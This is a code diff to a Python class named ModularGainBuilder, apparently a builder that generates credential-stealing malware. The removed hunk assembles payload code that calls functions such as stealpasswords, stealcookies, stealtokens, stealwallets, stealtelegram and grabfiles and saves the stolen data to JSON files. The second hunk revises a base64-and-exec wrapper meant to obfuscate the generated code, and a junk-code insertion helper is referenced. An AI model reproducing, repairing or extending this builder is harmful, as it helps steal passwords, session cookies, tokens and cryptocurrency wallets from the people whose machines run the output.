@@ -269,28 +269,6 @@ class ModularGainBuilder:
                 
                 if "{FEATURE_CONDITIONS}" in data_code:
                     conditions = ""
-                    for module_name, feature_key in feature_modules:
-                        if self.features[feature_key].get():
-                            func_name = ''
-                            if feature_key == 'passwords': func_name = 'stealpasswords'
-                            elif feature_key == 'cookies': func_name = 'stealcookies'
-                            elif feature_key == 'tokens': func_name = 'stealtokens'
-                            elif feature_key == 'wallets': func_name = 'stealwallets'
-                            elif feature_key == 'system_info': func_name = 'getsysteminfo'
-                            elif feature_key == 'clipboard': func_name = 'monitorclipboard'
-                            elif feature_key == 'telegram': func_name = 'stealtelegram'
-                            elif feature_key == 'files': func_name = 'grabfiles'
-                            
-                            if func_name:
-                                conditions += f"    try:\n"
-                                conditions += f"        {feature_key} = {func_name}()\n"
-                                conditions += f"        if {feature_key}:\n"
-                                conditions += f"            data['{feature_key}'] = {feature_key}\n"
-                                conditions += f"            with open(os.path.join(data_dir, '{feature_key}.json'), 'w', encoding='utf-8') as f:\n"
-                                conditions += f"                json.dump({feature_key}, f, indent=2)\n"
-                                conditions += f"    except:\n"
-                                conditions += f"        pass\n\n"
-                    
                     data_code = data_code.replace("{FEATURE_CONDITIONS}", conditions)
                 
                 final_code += data_code + "\n\n"
@@ -354,8 +332,8 @@ class ModularGainBuilder:
     
     def base64_encode(self, code):
         encoded = base64.b64encode(code.encode()).decode()
-        wrapper = f'''import base64
-exec(base64.b64decode("{encoded}"))'''
+        wrapper = '''import base64
+exec(base64.b64decode("''' + encoded + '''"))'''
         return wrapper
     
     def add_junk_code(self, code):
